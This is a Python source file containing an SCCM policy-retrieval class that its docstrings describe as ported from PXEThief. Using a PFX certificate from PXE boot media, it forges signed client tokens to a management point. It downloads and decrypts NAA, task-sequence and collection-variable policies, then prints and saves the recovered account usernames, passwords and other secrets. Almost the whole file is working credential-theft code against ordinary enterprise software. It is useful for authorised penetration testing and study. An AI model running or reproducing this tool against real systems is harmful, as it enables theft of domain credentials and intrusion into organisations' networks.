import binascii
import datetime
import zlib
import os
import glob
import xml.etree.ElementTree as ET

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
from requests_toolbelt.multipart.decoder import MultipartDecoder

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, utils
from cryptography.hazmat.primitives.serialization import pkcs12

from Crypto.Cipher import AES, DES3


class PolicyRetriever:
    """Retrieves and decrypts SCCM policies using PFX client certificate.
    Ported from PXEThief's policy retrieval logic to work on Linux.
    """

    def __init__(self, mp_url, site_code, pfx_bytes, pfx_password):
        self.mp_url = mp_url.rstrip("/")
        self.site_code = site_code
        self.pfx_bytes = pfx_bytes
        self.pfx_password = pfx_password

        # Load PFX
        self.private_key, self.cert, _ = pkcs12.load_key_and_certificates(
            pfx_bytes, pfx_password.encode()
        )

    def _sign_data_sha256(self, data):
        """Sign data with SHA256 + RSA PKCS1v15, mimicking Windows CryptSignHash
        with CRYPT_NOHASHOID. Windows reverses the byte order of the signature.
        """
        digest = hashes.Hash(hashes.SHA256())
        digest.update(data)
        hash_value = digest.finalize()

        signature = self.private_key.sign(
            hash_value,
            padding.PKCS1v15(),
            utils.Prehashed(hashes.SHA256())
        )
        # Windows CryptSignHash returns little-endian (reversed) signature
        return binascii.hexlify(signature[::-1]).decode()

    def _aes_des_key_derivation(self, password):
        """CryptDeriveKey key derivation — same as sccm.py."""
        from hashlib import sha1
        key_sha1 = sha1(password).digest()
        b0 = b""
        for x in key_sha1:
            b0 += bytes((x ^ 0x36,))
        b1 = b""
        for x in key_sha1:
            b1 += bytes((x ^ 0x5c,))
        b0 += b"\x36" * (64 - len(b0))
        b1 += b"\x5c" * (64 - len(b1))
        b0_sha1 = sha1(b0).digest()
        b1_sha1 = sha1(b1).digest()
        return b0_sha1 + b1_sha1

    def _3des_decrypt(self, data, key):
        """3DES CBC decryption with null IV."""
        des3 = DES3.new(key, DES3.MODE_CBC, b"\x00" * 8)
        decrypted = des3.decrypt(data)
        decrypted = self._pkcs7_unpad(decrypted, 8)
        return decrypted.decode("utf-16-le")

    def _aes_decrypt(self, data, key):
        """AES CBC decryption with null IV."""
        aes = AES.new(key, AES.MODE_CBC, b"\x00" * 16)
        decrypted = aes.decrypt(data)
        decrypted = self._pkcs7_unpad(decrypted, 16)
        return decrypted.decode("utf-16-le")

    @staticmethod
    def _pkcs7_unpad(data, block_size):
        if not data:
            return data
        pad_len = data[-1]
        if 0 < pad_len <= block_size and data.endswith(bytes([pad_len]) * pad_len):
            return data[:-pad_len]
        return data

    def _deobfuscate_credential_string(self, credential_string):
        """Deobfuscate SCCM credential strings (NAA passwords etc).
        Supports both CALG_3DES (0x6603) and AES (0x660E/0x660F/0x6610).
        """
        # Policy XML often wraps CDATA with whitespace/newlines.
        hex_string = "".join(ch for ch in credential_string if ch in "0123456789abcdefABCDEF")
        if len(hex_string) < 128:
            raise ValueError("credential string too short")
        if len(hex_string) % 2 != 0:
            raise ValueError("credential string has odd-length hex")

        key_data = binascii.unhexlify(hex_string[8:88])
        encrypted_data = binascii.unhexlify(hex_string[128:])
        key = self._aes_des_key_derivation(key_data)

        # ALG_ID is stored as little-endian DWORD in the obfuscation header.
        alg_id = int.from_bytes(binascii.unhexlify(hex_string[112:120]), "little")
        if alg_id == 0x6603:
            last_8 = (len(encrypted_data) // 8) * 8
            return self._3des_decrypt(encrypted_data[:last_8], key[:24])

        aes_key_lengths = {
            0x660E: 16,  # CALG_AES_128
            0x660F: 24,  # CALG_AES_192
            0x6610: 32,  # CALG_AES_256
        }
        if alg_id in aes_key_lengths:
            last_16 = (len(encrypted_data) // 16) * 16
            key_len = aes_key_lengths[alg_id]
            return self._aes_decrypt(encrypted_data[:last_16], key[:key_len])

        raise ValueError(f"unsupported credential encryption ALG_ID: 0x{alg_id:04x}")

    def _cms_decrypt(self, data):
        """Decrypt PKCS7/CMS enveloped data using the PFX private key.
        SCCM uses SubjectKeyIdentifier in RecipientInfo which openssl can't
        parse, so we manually parse the ASN1 DER structure:
        1. Extract encrypted CEK and encrypted content
        2. RSA-decrypt the content encryption key (CEK)
        3. 3DES-CBC decrypt the content with the CEK
        """
        from cryptography.hazmat.primitives.asymmetric import padding as asym_padding

        def read_tag_len(d, p):
            if p + 2 > len(d):
                raise ValueError("truncated CMS data")
            tag = d[p]
            p += 1
            length = d[p]
            p += 1
            if length & 0x80:
                n = length & 0x7f
                if n == 0:
                    raise ValueError("indefinite-length CMS not supported")
                if p + n > len(d):
                    raise ValueError("truncated CMS length")
                length = int.from_bytes(d[p:p+n], 'big')
                p += n
            end = p + length
            if end > len(d):
                raise ValueError("truncated CMS value")
            return tag, length, p, end

        def require_tag(actual, expected, desc):
            if actual != expected:
                raise ValueError(
                    f"unexpected {desc} tag 0x{actual:02x}, expected 0x{expected:02x}"
                )

        def decode_oid(oid_bytes):
            if not oid_bytes:
                raise ValueError("empty OID")

            first = oid_bytes[0]
            numbers = [first // 40, first % 40]
            value = 0

            for byte in oid_bytes[1:]:
                value = (value << 7) | (byte & 0x7F)
                if not byte & 0x80:
                    numbers.append(value)
                    value = 0

            if value:
                numbers.append(value)

            return ".".join(str(n) for n in numbers)

        # Outer SEQUENCE
        tag, _, pos, _ = read_tag_len(data, 0)
        require_tag(tag, 0x30, "ContentInfo")
        # OID (pkcs7-envelopedData)
        tag, oid_len, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0x06, "contentType OID")
        pos += oid_len
        # [0] CONSTRUCTED
        tag, _, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0xA0, "[0] content")
        # EnvelopedData SEQUENCE
        tag, _, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0x30, "EnvelopedData")
        # Version INTEGER
        tag, ver_len, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0x02, "envelopedData version")
        pos += ver_len
        # SET of RecipientInfo
        tag, _, pos, set_end = read_tag_len(data, pos)
        require_tag(tag, 0x31, "recipientInfos")
        # RecipientInfo SEQUENCE
        tag, _, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0x30, "RecipientInfo")
        # Version INTEGER
        tag, v_len, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0x02, "recipient version")
        pos += v_len
        # RecipientIdentifier (skip)
        _, rid_len, pos, _ = read_tag_len(data, pos)
        pos += rid_len
        # KeyEncryptionAlgorithm SEQUENCE (skip)
        tag, _, pos, kea_end = read_tag_len(data, pos)
        require_tag(tag, 0x30, "keyEncryptionAlgorithm")
        tag, alg_len, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0x06, "keyEncryptionAlgorithm OID")
        key_encryption_alg = decode_oid(data[pos:pos+alg_len])
        pos = kea_end
        # EncryptedKey OCTET STRING
        tag, _, pos, ek_end = read_tag_len(data, pos)
        require_tag(tag, 0x04, "encryptedKey")
        encrypted_key = data[pos:ek_end]
        pos = set_end

        # EncryptedContentInfo SEQUENCE
        tag, _, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0x30, "EncryptedContentInfo")
        # ContentType OID (skip)
        tag, ct_len, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0x06, "encryptedContentType OID")
        pos += ct_len
        # ContentEncryptionAlgorithm SEQUENCE
        tag, _, pos, cea_end = read_tag_len(data, pos)
        require_tag(tag, 0x30, "contentEncryptionAlgorithm")
        # Algorithm OID (skip)
        tag, alg_len, pos, _ = read_tag_len(data, pos)
        require_tag(tag, 0x06, "contentEncryptionAlgorithm OID")
        content_encryption_alg = decode_oid(data[pos:pos+alg_len])
        pos += alg_len
        # IV OCTET STRING
        tag, _, pos, iv_end = read_tag_len(data, pos)
        require_tag(tag, 0x04, "contentEncryptionAlgorithm params")
        iv = data[pos:iv_end]
        pos = cea_end
        # [0] EncryptedContent
        tag, _, pos, ec_end = read_tag_len(data, pos)
        if tag == 0x80:
            ciphertext = data[pos:ec_end]
        elif tag == 0xA0:
            # BER form can split implicit OCTET STRING into nested chunks.
            chunks = []
            inner_pos = pos
            while inner_pos < ec_end:
                inner_tag, _, inner_pos, inner_end = read_tag_len(data, inner_pos)
                require_tag(inner_tag, 0x04, "encryptedContent chunk")
                chunks.append(data[inner_pos:inner_end])
                inner_pos = inner_end
            ciphertext = b"".join(chunks)
        else:
            raise ValueError(f"unexpected encryptedContent tag 0x{tag:02x}")

        if key_encryption_alg == "1.2.840.113549.1.1.7":
            cek = self.private_key.decrypt(
                encrypted_key,
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA1()),
                    algorithm=hashes.SHA1(),
                    label=None,
                ),
            )
        elif key_encryption_alg == "1.2.840.113549.1.1.1":
            cek = self.private_key.decrypt(encrypted_key, asym_padding.PKCS1v15())
        else:
            raise ValueError(f"unsupported key transport OID: {key_encryption_alg}")

        if content_encryption_alg == "1.2.840.113549.3.7":
            cipher = DES3.new(DES3.adjust_key_parity(cek), DES3.MODE_CBC, iv)
            block_size = 8
        elif content_encryption_alg == "2.16.840.1.101.3.4.1.2":
            cipher = AES.new(cek[:16], AES.MODE_CBC, iv)
            block_size = 16
        elif content_encryption_alg == "2.16.840.1.101.3.4.1.22":
            cipher = AES.new(cek[:24], AES.MODE_CBC, iv)
            block_size = 16
        elif content_encryption_alg == "2.16.840.1.101.3.4.1.42":
            cipher = AES.new(cek[:32], AES.MODE_CBC, iv)
            block_size = 16
        else:
            raise ValueError(f"unsupported content encryption OID: {content_encryption_alg}")

        plaintext = cipher.decrypt(ciphertext)
        plaintext = self._pkcs7_unpad(plaintext, block_size)

        return plaintext

    def _write_client_pem(self, output_dir):
        """Write the PFX cert + private key as PEM files for requests' TLS client auth."""
        cert_path = os.path.join(output_dir, "_mp_client_cert.pem")
        key_path = os.path.join(output_dir, "_mp_client_key.pem")
        with open(cert_path, "wb") as f:
            f.write(self.cert.public_bytes(serialization.Encoding.PEM))
        with open(key_path, "wb") as f:
            f.write(self.private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        os.chmod(key_path, 0o600)
        return cert_path, key_path

    def _fetch_mp_key_info(self, session, output_dir):
        """Hit MPKEYINFORMATIONMEDIA and return (x64UnknownMachineGUID, sitecode)."""
        print(f"[*] Requesting MPKEYINFORMATIONMEDIA from {self.mp_url}...")
        r = session.get(self.mp_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")

        mpkey_path = os.path.join(output_dir, "MPKEYINFORMATIONMEDIA.xml")
        with open(mpkey_path, "w") as f:
            f.write(r.text)

        if r.status_code != 200:
            raise RuntimeError(
                f"MPKEYINFORMATIONMEDIA HTTP {r.status_code} from {self.mp_url}. "
                f"Saved response to {mpkey_path}. "
                f"If MP requires HTTPS / Enhanced HTTP, try --mp https://<MP> instead."
            )

        try:
            root = ET.fromstring(r.text)
        except ET.ParseError as e:
            snippet = r.text[:300].replace("\n", " ")
            raise RuntimeError(
                f"MPKEYINFORMATIONMEDIA response is not valid XML: {e}. "
                f"Saved to {mpkey_path}. First 300 chars: {snippet!r}"
            )

        unknown_machines = root.find("UnknownMachines")
        sitecode_el = root.find("SITECODE")
        if unknown_machines is None or unknown_machines.get("x64UnknownMachineGUID") is None:
            child_tags = sorted({el.tag for el in root}) or [root.tag]
            raise RuntimeError(
                "MP response is missing <UnknownMachines x64UnknownMachineGUID=...>. "
                f"Top-level elements seen: {child_tags}. "
                "Likely causes: (1) 'Allow PXE responses to unknown computers' is disabled on the DP/MP, "
                "(2) MP requires HTTPS / Enhanced HTTP — try --mp https://<MP>, "
                f"(3) wrong MP URL. Full response saved to {mpkey_path}."
            )
        machine_client_id = unknown_machines.get("x64UnknownMachineGUID")
        sitecode = sitecode_el.text if sitecode_el is not None else self.site_code
        return machine_client_id, sitecode

    def retrieve_policies(self, client_id, output_dir, machine_client_id_override=None):
        """Full policy retrieval flow:
        1. Get MPKEYINFORMATIONMEDIA (skipped if machine_client_id_override given)
        2. Generate auth signatures
        3. Request policy assignments
        4. Download NAAConfig, TaskSequence, CollectionSettings
        5. Decrypt and extract credentials
        """
        os.makedirs(output_dir, exist_ok=True)
        session = requests.Session()
        # SCCM management points often use self-signed certificates
        session.verify = False
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except ImportError:
            pass

        # In HTTPS-only / PKI mode the MP requires TLS client-cert auth.
        # Present the media PFX as a client cert — same thing real PXE clients do.
        cert_path, key_path = self._write_client_pem(output_dir)
        session.cert = (cert_path, key_path)
        print(f"[*] Using PFX as TLS client cert for MP auth")

        # Use the media GUID as CCMClientID
        ccm_client_id = client_id

        # Generate signatures
        print("[*] Generating client authentication signatures...")
        data = ccm_client_id.encode("utf-16-le") + b'\x00\x00'
        ccm_client_id_sig = self._sign_data_sha256(data)

        ccm_timestamp = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0, tzinfo=None).isoformat() + 'Z'
        data = ccm_timestamp.encode("utf-16-le") + b'\x00\x00'
        ccm_timestamp_sig = self._sign_data_sha256(data)

        data = (ccm_client_id + ';' + ccm_timestamp + "\0").encode("utf-16-le")
        client_token_sig = self._sign_data_sha256(data)

        # If caller already has the GUID (from variables.xml), skip the MP key call.
        if machine_client_id_override:
            machine_client_id = machine_client_id_override
            sitecode = self.site_code
            print(f"[*] Using x64UnknownMachineGUID from variables.xml: {machine_client_id} (skipped MPKEYINFORMATIONMEDIA)")
        else:
            machine_client_id, sitecode = self._fetch_mp_key_info(session, output_dir)
        print(f"[*] Site code: {sitecode}, x64UnknownMachineGUID: {machine_client_id}")

        # Build policy request payloads
        first_payload = b'\xFF\xFE' + (
            '<Msg><ID/><SourceID>' + machine_client_id +
            '</SourceID><ReplyTo>direct:OSD</ReplyTo>'
            '<Body Type="ByteRange" Offset="0" Length="728"/>'
            '<Hooks><Hook2 Name="clientauth">'
            '<Property Name="Token"><![CDATA[ClientToken:' +
            ccm_client_id + ';' + ccm_timestamp +
            '\r\nClientTokenSignature:' + client_token_sig +
            '\r\n]]></Property></Hook2></Hooks>'
            '<Payload Type="inline"/>'
            '<TargetEndpoint>MP_PolicyManager</TargetEndpoint>'
            '<ReplyMode>Sync</ReplyMode></Msg>'
        ).encode("utf-16-le")

        second_payload = (
            '<RequestAssignments SchemaVersion="1.00" RequestType="Always" '
            'Ack="False" ValidationRequested="CRC">'
            '<PolicySource>SMS:' + sitecode + '</PolicySource>'
            '<ServerCookie/><Resource ResourceType="Machine"/>'
            '<Identification><Machine><ClientID>' + machine_client_id +
            '</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN>'
            '<SID/></Machine></Identification></RequestAssignments>\r\n'
        ).encode("utf-16-le") + b'\x00\x00\x00'

        me = MultipartEncoder(fields={
            'Msg': (None, first_payload, "text/plain; charset=UTF-16"),
            'RequestAssignments': second_payload
        })

        print("[*] Requesting policy assignments...")
        r = session.request(
            "CCM_POST",
            self.mp_url + "/ccm_system/request",
            data=me,
            headers={'Content-Type': me.content_type.replace("form-data", "mixed")}
        )

        # Save raw response so we can inspect failures
        reply_path = os.path.join(output_dir, "PolicyAssignmentsResponse.raw")
        with open(reply_path, "wb") as f:
            f.write(r.content)
        resp_ctype = r.headers.get("Content-Type", "")
        if r.status_code != 200 or "multipart" not in resp_ctype.lower():
            snippet = r.content[:400].decode("utf-8", errors="replace").replace("\n", " ")
            raise RuntimeError(
                f"Policy assignment request failed: HTTP {r.status_code}, "
                f"Content-Type={resp_ctype!r}. Saved body to {reply_path}. "
                f"First 400 chars: {snippet!r}"
            )

        multipart_data = MultipartDecoder.from_response(r)

        # Parse policy assignments
        policy_xml = zlib.decompress(multipart_data.parts[1].content).decode("utf-16-le")
        wf_policy_xml = "".join(c for c in policy_xml if c.isprintable())

        with open(os.path.join(output_dir, "ReplyAssignments.xml"), "w") as f:
            f.write(wf_policy_xml)

        root = ET.fromstring(wf_policy_xml)
        policy_urls = {}
        dedup = 0

        for pa in root.findall("PolicyAssignment"):
            for policy in pa.findall("Policy"):
                cat = policy.get("PolicyCategory")
                url = policy.find("PolicyLocation").text.replace("http://<mp>", self.mp_url)
                if cat and cat not in policy_urls:
                    policy_urls[cat] = url
                elif cat is None:
                    pid = policy.get("PolicyID", "")
                    safe_pid = "".join(i for i in pid if i not in "\\/:*?<>|")
                    policy_urls[safe_pid] = url
                else:
                    policy_urls[cat + str(dedup)] = url
                    dedup += 1

        print(f"[*] {len(policy_urls)} policy assignment URLs found")

        headers = {
            'CCMClientID': ccm_client_id,
            'CCMClientIDSignature': ccm_client_id_sig,
            'CCMClientTimestamp': ccm_timestamp,
            'CCMClientTimestampSignature': ccm_timestamp_sig
        }

        # Download relevant policies
        results = {"naa": [], "ts": [], "col": []}

        for category, url in policy_urls.items():
            if "NAAConfig" in category:
                print(f"[*] Requesting NAAConfig from: {url}")
                results["naa"].append(session.get(url, headers=headers))
            if "TaskSequence" in category:
                print(f"[*] Requesting TaskSequence from: {url}")
                results["ts"].append(session.get(url, headers=headers))
            if "CollectionSettings" in category:
                print(f"[*] Requesting CollectionSettings from: {url}")
                results["col"].append(session.get(url, headers=headers))

        # Process NAA configs
        print("\n[*] Processing Network Access Account Configuration...")
        naa_creds = []
        for resp in results["naa"]:
            try:
                # Try plaintext first (HTTPS case)
                try:
                    naa_xml = resp.content.decode("utf-16-le")
                except (UnicodeDecodeError, AttributeError):
                    # Encrypted — decrypt with cert
                    print("[*] Decrypting NAA policy with PFX cert...")
                    decrypted = self._cms_decrypt(resp.content)
                    naa_xml = decrypted.decode("utf-16-le")

                naa_xml = "".join(c for c in naa_xml if c.isprintable())

                with open(os.path.join(output_dir, "NAAConfig.xml"), "w") as f:
                    f.write(naa_xml)

                naa_creds.extend(self._process_naa_xml(naa_xml))
            except Exception as e:
                print(f"[!] Failed to process NAA config: {e}")
                # Save raw response for manual analysis
                with open(os.path.join(output_dir, "NAAConfig.raw"), "wb") as f:
                    f.write(resp.content)
                print(f"[*] Saved raw NAA response to {os.path.join(output_dir, 'NAAConfig.raw')}")

        # Process Task Sequences
        credential_hits = []
        print("\n[*] Processing Task Sequence Configuration...")
        for i, resp in enumerate(results["ts"]):
            try:
                try:
                    ts_xml = resp.content.decode("utf-16-le")
                except (UnicodeDecodeError, AttributeError):
                    print("[*] Decrypting Task Sequence policy with PFX cert...")
                    decrypted = self._cms_decrypt(resp.content)
                    ts_xml = decrypted.decode("utf-16-le")

                ts_xml = "".join(c for c in ts_xml if c.isprintable())

                ts_path = os.path.join(output_dir, f"TaskSequence_{i}.xml")
                with open(ts_path, "w") as f:
                    f.write(ts_xml)
                print(f"[*] Saved Task Sequence to {ts_path}")

                ts_filename, hits = self._process_task_sequence_xml(ts_xml, output_dir)
                if hits:
                    credential_hits.append((f"TaskSequence_{i}", ts_filename, hits))
            except Exception as e:
                print(f"[!] Failed to process Task Sequence: {e}")
                with open(os.path.join(output_dir, f"TaskSequence_{i}.raw"), "wb") as f:
                    f.write(resp.content)

        # Process Collection Settings
        print("\n[*] Processing Collection Settings...")
        col_vars = []
        for resp in results["col"]:
            try:
                try:
                    col_xml = resp.content.decode("utf-16-le")
                except (UnicodeDecodeError, AttributeError):
                    print("[*] Decrypting Collection Settings with PFX cert...")
                    decrypted = self._cms_decrypt(resp.content)
                    col_xml = decrypted.decode("utf-16-le")

                col_xml = "".join(c for c in col_xml if c.isprintable())

                with open(os.path.join(output_dir, "CollectionSettings.xml"), "w") as f:
                    f.write(col_xml)

                # Decompress and parse collection variables
                root = ET.fromstring(col_xml)
                col_data = zlib.decompress(binascii.unhexlify(root.text)).decode("utf-16-le")
                col_data = "".join(c for c in col_data if c.isprintable())
                root = ET.fromstring(col_data)

                instances = root.find("PolicyRule").find("PolicyAction").findall("instance")
                for instance in instances:
                    name_el = instance.find(".//*[@name='Name']/value")
                    val_el = instance.find(".//*[@name='Value']/value")
                    if name_el is not None and val_el is not None:
                        var_name = name_el.text
                        var_secret = self._deobfuscate_credential_string(val_el.text)
                        var_secret = var_secret[:var_secret.rfind('\x00')] if '\x00' in var_secret else var_secret
                        print(f"[!] Collection Variable: '{var_name}' = '{var_secret}'")
                        col_vars.append((var_name, var_secret))
            except Exception as e:
                print(f"[!] Failed to process Collection Settings: {e}")

        self._write_naa_credentials(naa_creds, output_dir)
        self._write_collection_variables(col_vars, output_dir)
        if credential_hits:
            summary_path = os.path.join(output_dir, "task_sequence_credentials.txt")
            with open(summary_path, "w") as f:
                for ts_source, ts_output, hits in credential_hits:
                    f.write(f"== {ts_source} -> {ts_output}\n")
                    for step_name, name, prop, value in hits:
                        if step_name:
                            f.write(f"[Step: {step_name}] {name} ({prop}) = {value}\n")
                        else:
                            f.write(f"{name} ({prop}) = {value}\n")
                    f.write("\n")
            print(f"[*] Wrote task sequence credential summary to {summary_path}")

    def _process_naa_xml(self, naa_xml):
        """Extract NAA credentials from policy XML.

        Returns list of (username, password) tuples; either may be None if missing.
        """
        root = ET.fromstring(naa_xml)
        results = []

        # Look for CCM_NetworkAccessAccount instances
        for instance in root.iter("instance"):
            class_attr = instance.get("class", "")
            if "CCM_NetworkAccessAccount" in class_attr:
                username_el = instance.find(".//*[@name='NetworkAccessUsername']/value")
                password_el = instance.find(".//*[@name='NetworkAccessPassword']/value")

                username = None
                password = None
                if username_el is not None and username_el.text:
                    username = self._deobfuscate_credential_string(username_el.text)
                    username = username[:username.rfind('\x00')] if '\x00' in username else username
                    print(f"[!] Network Access Account Username: '{username}'")

                if password_el is not None and password_el.text:
                    password = self._deobfuscate_credential_string(password_el.text)
                    password = password[:password.rfind('\x00')] if '\x00' in password else password
                    print(f"[!] Network Access Account Password: '{password}'")

                if username or password:
                    results.append((username, password))
        return results

    def _write_naa_credentials(self, naa_creds, output_dir):
        if not naa_creds:
            return
        path = os.path.join(output_dir, "naa_credentials.txt")
        with open(path, "w") as f:
            for i, (u, p) in enumerate(naa_creds):
                f.write(f"NAA Instance {i}\n")
                f.write(f"  Username: {u if u is not None else '(empty)'}\n")
                f.write(f"  Password: {p if p is not None else '(empty)'}\n\n")
        print(f"[*] Wrote NAA credential summary to {path}")

    def _write_collection_variables(self, col_vars, output_dir):
        if not col_vars:
            return
        path = os.path.join(output_dir, "collection_variables.txt")
        with open(path, "w") as f:
            for name, value in col_vars:
                f.write(f"{name} = {value}\n")
        print(f"[*] Wrote collection variables to {path}")

    def _process_task_sequence_xml(self, ts_xml, output_dir):
        """Extract credentials from task sequence policies.
        Returns (output_filename, hits) tuple.
        """
        root = ET.fromstring(ts_xml)

        pkg_name_el = root.find(".//*[@name='PKG_Name']/value")
        adv_id_el = root.find(".//*[@name='ADV_AdvertisementID']/value")
        ts_seq_el = root.find(".//*[@name='TS_Sequence']/value")

        pkg_name = pkg_name_el.text if pkg_name_el is not None else "Unknown"
        adv_id = adv_id_el.text if adv_id_el is not None else "Unknown"

        print(f"[*] Task Sequence: {pkg_name} ({adv_id})")

        if ts_seq_el is not None and ts_seq_el.text:
            ts_sequence = ts_seq_el.text
            if ts_sequence.lstrip().startswith("<sequence"):
                # Plaintext
                pass
            else:
                try:
                    ts_sequence = self._deobfuscate_credential_string(ts_sequence)
                    ts_sequence = ts_sequence[:ts_sequence.rfind(">") + 1]
                    print(f"[*] Successfully decrypted TS_Sequence")
                except Exception:
                    print(f"[!] Failed to decrypt TS_Sequence")
                    return None, []

            ts_name = f"{pkg_name}-{adv_id}"
            safe_name = "".join(c for c in ts_name if c.isalnum() or c in " ._-").rstrip()
            ts_filename = f"{safe_name}.xml"
            ts_path = os.path.join(output_dir, ts_filename)
            with open(ts_path, "w") as f:
                f.write(ts_sequence)
            print(f"[*] Wrote TS_Sequence to {ts_path}")

            # Search for credential fields
            return ts_filename, self._find_creds_in_ts(ts_sequence)

        return None, []

    def _find_creds_in_ts(self, ts_xml):
        """Search task sequence XML for credential fields.

        Enhanced from cred1py: searches ALL elements (not just <variable>),
        uses case-insensitive keyword matching, and reports the parent TS step
        name for context (ported from PXEThief's analyse_task_sequence_for_potential_creds).

        Returns list of (step_name, name, prop, value) tuples.
        """
        try:
            root = ET.fromstring(ts_xml)
        except ET.ParseError:
            return []

        keywords = ("password", "username", "account", "credential")

        # Build parent map since stdlib ElementTree lacks getparent()
        parent_map = {child: parent for parent in root.iter() for child in parent}

        hits = []
        seen = set()
        seen_parents = set()

        for elem in root.iter():
            name_attr = (elem.get("name") or "").strip()
            prop_attr = (elem.get("property") or "").strip()
            value = (elem.text or "").strip()

            if not name_attr:
                continue

            # Case-insensitive keyword match on name attribute
            name_lower = name_attr.lower()
            if not any(kw in name_lower for kw in keywords):
                continue

            if not value:
                continue

            # Walk up to find the enclosing TS step name
            step_name = None
            current = elem
            while current in parent_map:
                current = parent_map[current]
                if current.tag == "step" or current.tag == "group":
                    step_name = current.get("name", None)
                    break
                # Also check defaultVarList parent's parent
                if current.tag == "defaultVarList" and current in parent_map:
                    grandparent = parent_map[current]
                    step_name = grandparent.get("name", None)
                    break

            hit = (step_name, name_attr, prop_attr, value)
            hit_key = (name_attr, prop_attr, value)
            if hit_key in seen:
                continue
            seen.add(hit_key)

            # Group related fields by parent — print step header once
            parent = parent_map.get(elem)
            parent_id = id(parent) if parent is not None else None
            if parent_id not in seen_parents and step_name:
                seen_parents.add(parent_id)
                if hits:
                    pass  # spacing handled in output

            hits.append(hit)

        if hits:
            print("[!] Possible credential fields found:")
            current_step = None
            for step_name, name, prop, value in hits:
                if step_name != current_step:
                    current_step = step_name
                    if step_name:
                        print(f"\n    In TS Step \"{step_name}\":")
                value_out = value if len(value) <= 200 else value[:200] + "..."
                prop_str = f" ({prop})" if prop else ""
                print(f"    {name}{prop_str} = {value_out}")

        return hits

    def process_local_policy_blobs(self, input_dir, output_dir):
        """Decrypt previously downloaded policy .raw files from disk.

        Expected files in input_dir:
        - NAAConfig.raw
        - TaskSequence_*.raw
        - CollectionSettings.raw (optional)
        """
        os.makedirs(output_dir, exist_ok=True)
        input_dir = os.path.abspath(input_dir)
        print(f"[*] Processing local policy blobs from {input_dir}")

        # NAAConfig
        naa_raw = os.path.join(input_dir, "NAAConfig.raw")
        naa_creds = []
        if os.path.exists(naa_raw):
            try:
                print(f"[*] Decrypting local NAAConfig: {naa_raw}")
                with open(naa_raw, "rb") as raw_f:
                    decrypted = self._cms_decrypt(raw_f.read())
                naa_xml = decrypted.decode("utf-16-le")
                naa_xml = "".join(c for c in naa_xml if c.isprintable())
                naa_out = os.path.join(output_dir, "NAAConfig.xml")
                with open(naa_out, "w") as f:
                    f.write(naa_xml)
                print(f"[*] Wrote {naa_out}")
                naa_creds.extend(self._process_naa_xml(naa_xml))
            except Exception as e:
                print(f"[!] Failed to process local NAAConfig.raw: {e}")
        else:
            print(f"[*] NAAConfig.raw not found in {input_dir}")

        # TaskSequence blobs
        ts_raw_files = sorted(glob.glob(os.path.join(input_dir, "TaskSequence_*.raw")))
        print(f"[*] {len(ts_raw_files)} local TaskSequence blob(s) found")
        credential_hits = []
        for ts_raw in ts_raw_files:
            ts_name = os.path.basename(ts_raw)
            try:
                print(f"[*] Decrypting local TaskSequence: {ts_name}")
                with open(ts_raw, "rb") as raw_f:
                    decrypted = self._cms_decrypt(raw_f.read())
                ts_xml = decrypted.decode("utf-16-le")
                ts_xml = "".join(c for c in ts_xml if c.isprintable())

                ts_out = os.path.join(output_dir, ts_name.replace(".raw", ".xml"))
                with open(ts_out, "w") as f:
                    f.write(ts_xml)
                print(f"[*] Wrote {ts_out}")

                ts_filename, hits = self._process_task_sequence_xml(ts_xml, output_dir)
                if hits:
                    credential_hits.append((ts_name, ts_filename, hits))
            except Exception as e:
                print(f"[!] Failed to process local {ts_name}: {e}")

        # CollectionSettings
        col_raw = os.path.join(input_dir, "CollectionSettings.raw")
        col_vars = []
        if os.path.exists(col_raw):
            try:
                print(f"[*] Decrypting local CollectionSettings: {col_raw}")
                with open(col_raw, "rb") as raw_f:
                    decrypted = self._cms_decrypt(raw_f.read())
                col_xml = decrypted.decode("utf-16-le")
                col_xml = "".join(c for c in col_xml if c.isprintable())

                col_out = os.path.join(output_dir, "CollectionSettings.xml")
                with open(col_out, "w") as f:
                    f.write(col_xml)
                print(f"[*] Wrote {col_out}")

                root = ET.fromstring(col_xml)
                col_data = zlib.decompress(binascii.unhexlify(root.text)).decode("utf-16-le")
                col_data = "".join(c for c in col_data if c.isprintable())
                root = ET.fromstring(col_data)
                instances = root.find("PolicyRule").find("PolicyAction").findall("instance")
                for instance in instances:
                    name_el = instance.find(".//*[@name='Name']/value")
                    val_el = instance.find(".//*[@name='Value']/value")
                    if name_el is not None and val_el is not None:
                        var_name = name_el.text
                        var_secret = self._deobfuscate_credential_string(val_el.text)
                        var_secret = var_secret[:var_secret.rfind('\x00')] if '\x00' in var_secret else var_secret
                        print(f"[!] Collection Variable: '{var_name}' = '{var_secret}'")
                        col_vars.append((var_name, var_secret))
            except Exception as e:
                print(f"[!] Failed to process local CollectionSettings.raw: {e}")

        self._write_naa_credentials(naa_creds, output_dir)
        self._write_collection_variables(col_vars, output_dir)
        if credential_hits:
            summary_path = os.path.join(output_dir, "task_sequence_credentials.txt")
            with open(summary_path, "w") as f:
                for ts_source, ts_output, hits in credential_hits:
                    f.write(f"== {ts_source} -> {ts_output}\n")
                    for step_name, name, prop, value in hits:
                        if step_name:
                            f.write(f"[Step: {step_name}] {name} ({prop}) = {value}\n")
                        else:
                            f.write(f"{name} ({prop}) = {value}\n")
                    f.write("\n")
            print(f"[*] Wrote task sequence credential summary to {summary_path}")
